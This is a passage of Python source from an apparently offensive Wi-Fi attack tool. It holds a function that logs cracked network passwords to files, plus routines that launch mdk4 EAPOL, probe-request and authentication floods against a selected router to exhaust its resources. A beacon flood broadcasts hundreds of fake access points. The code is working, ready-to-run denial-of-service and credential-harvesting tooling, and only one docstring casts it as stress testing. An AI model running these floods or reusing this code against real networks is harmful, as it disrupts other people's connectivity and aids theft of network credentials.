        self.core.run_command("pkill hostapd 2>/dev/null")
        self.core.run_command("pkill dnsmasq 2>/dev/null")
        self.core.run_command("systemctl start NetworkManager 2>/dev/null")

    def _save_creds(self, target, password):
        line = (
            f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
            f"  SSID: {target['essid']}"
            f"  |  BSSID: {target['bssid']}"
            f"  |  Password: {password}\n"
        )
        # Save to temp (volatile) — always
        try:
            with open("/tmp/ns_cracked.txt", "a") as f:
                f.write(line)
        except Exception:
            pass
        # Save to session dir (persistent across reboots)
        try:
            import os as _os
            session_dir = _os.path.expanduser("~/netstrike")
            _os.makedirs(session_dir, exist_ok=True)
            session_file = _os.path.join(session_dir, "cracked.txt")
            with open(session_file, "a") as f:
                f.write(line)
            print(f"\033[1;32m[💾] Saved → {session_file}\033[0m")
        except Exception:
            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")

    # ═══════════════════════════════════════════════
    # 8. PROBE + EAPOL FLOOD
    # ═══════════════════════════════════════════════

    def probe_eapol_flood(self):
        """
        MDK4 probe request flood + EAPOL flood simultaneously.
        Overwhelms AP management frame processing — causes high CPU/memory on router.
        """
        if not self.scanner.wifi_scan(10):
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return

        bssid   = target['bssid']
        channel = self._safe_channel(target)
        essid   = target['essid']
        mon     = self.core.mon_interface

        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
        self.core.set_current_operation("PROBE_EAPOL_FLOOD")
        self.attack_running = True

        print(f"\033[1;31m[💣] PROBE + EAPOL FLOOD: {essid}\033[0m")

        # EAPOL flood — exhausts AP authentication state machine
        p1 = self.core.run_command(
            f"mdk4 {mon} x -t {bssid} -n '{essid}'",
            background=True
        )
        # Probe request flood — floods management queue
        p2 = self.core.run_command(
            f"mdk4 {mon} p -b {bssid} -c {channel}",
            background=True
        )
        # Auth flood — fills association table
        p3 = self.core.run_command(
            f"mdk4 {mon} a -a {bssid} -m",
            background=True
        )

        for p in [p1, p2, p3]:
            if p:
                self.attack_processes.append(p)
                self.core.add_attack_process(p)

        print("\033[1;31m[🔥] EAPOL flood: ACTIVE\033[0m")
        print("\033[1;31m[🔥] Probe flood: ACTIVE\033[0m")
        print("\033[1;31m[🔥] Auth flood:  ACTIVE\033[0m")

        threading.Thread(target=self._anim_stress, daemon=True).start()
        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
        input()
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] Flood terminated\033[0m")

    # ═══════════════════════════════════════════════
    # 9. BEACON FLOOD
    # ═══════════════════════════════════════════════

    def beacon_flood(self):
        """Flood the air with fake APs — stress tests WIDS/WIPS"""
        mon = self.core.mon_interface

        print("\n\033[1;35m┌─ Beacon Flood Mode ──────────────────────────┐\033[0m")
        print("\033[1;35m│  1) RANDOM SSIDs   Fully random AP names       │\033[0m")
        print("\033[1;35m│  2) CUSTOM PREFIX  Prefix + sequence number    │\033[0m")
        print("\033[1;35m└───────────────────────────────────────────────┘\033[0m")
        mode = input("\033[1;36m[?] Mode (1/2): \033[0m").strip()

        ch_raw = input("\033[1;36m[?] Channel (1-13, or Enter for all channels): \033[0m").strip()
        ch_opt = ""
        if ch_raw.isdigit() and 1 <= int(ch_raw) <= 13:
            ch_opt = f"-c {ch_raw}"

        if mode == "2":
            prefix = input("\033[1;36m[?] SSID prefix (e.g. PHANTOM): \033[0m").strip() or "PHANTOM"
            ssid_file = "/tmp/ns_beacons.txt"
            with open(ssid_file, 'w') as f:
                for i in range(200):
                    f.write(f"{prefix}_{i:03d}\n")
            cmd = f"mdk4 {mon} b -f {ssid_file} {ch_opt} -s 1000"
            print(f"\033[1;35m[📻] CUSTOM BEACON FLOOD: 200 APs with prefix '{prefix}'\033[0m")
        else:
            cmd = f"mdk4 {mon} b {ch_opt} -s 1000"
            print(f"\033[1;35m[📻] RANDOM BEACON FLOOD: unlimited fake APs\033[0m")

        self.core.set_current_operation("BEACON_FLOOD")
        self.attack_running = True

        p = self.core.run_command(cmd, background=True)
        if p:
            self.attack_processes.append(p)
            self.core.add_attack_process(p)

        threading.Thread(target=self._anim_beacon, daemon=True).start()
        print("\033[1;33m[⏹] Press Enter to stop beacon flood...\033[0m")
        input()
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] Beacon flood terminated\033[0m")

    # ═══════════════════════════════════════════════
    # ANIMATIONS
    # ═══════════════════════════════════════════════

    def _anim_single(self, essid, stealth):
        frames = ["░", "▒", "▓", "▒"] if stealth else ["⚡", "💥", "🔥", "💢"]
        label  = "STEALTH" if stealth else "PHANTOM"
        i = 0
        while self.attack_running:
            print(f"\r\033[1;31m[{frames[i % 4]}] {label}: disrupting {essid}...\033[0m", end="", flush=True)
            i += 1
            time.sleep(0.5 if stealth else 0.3)

    def _anim_mass(self, count, stealth):
        frames = ["░", "▒", "▓", "▒"] if stealth else ["🌐", "⚡", "💥", "🔥"]
        label  = "STEALTH MASS" if stealth else "PHANTOM MASS"
        i = 0
        while self.attack_running:
            print(f"\r\033[1;31m[{frames[i % 4]}] {label}: {count} targets active...\033[0m", end="", flush=True)
            i += 1
            time.sleep(0.5)

    def _anim_stress(self):
        frames = ["💀", "⚡", "💥", "🔥", "🌡"]
        i = 0
        while self.attack_running:
            print(f"\r\033[1;31m[{frames[i % 5]}] ROUTER STRESS: all vectors firing...\033[0m", end="", flush=True)
            i += 1
            time.sleep(0.35)

    def _anim_beacon(self):
        frames = ["📡", "🔵", "📶", "🔴"]
        i = 0
        while self.attack_running:
            print(f"\r\033[1;35m[{frames[i % 4]}] BEACON FLOOD: broadcasting phantom APs...\033[0m", end="", flush=True)
            i += 1
            time.sleep(0.4)

    # ═══════════════════════════════════════════════
    # STOP
    # ═══════════════════════════════════════════════

    def stop_attacks(self):
        self.attack_running   = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
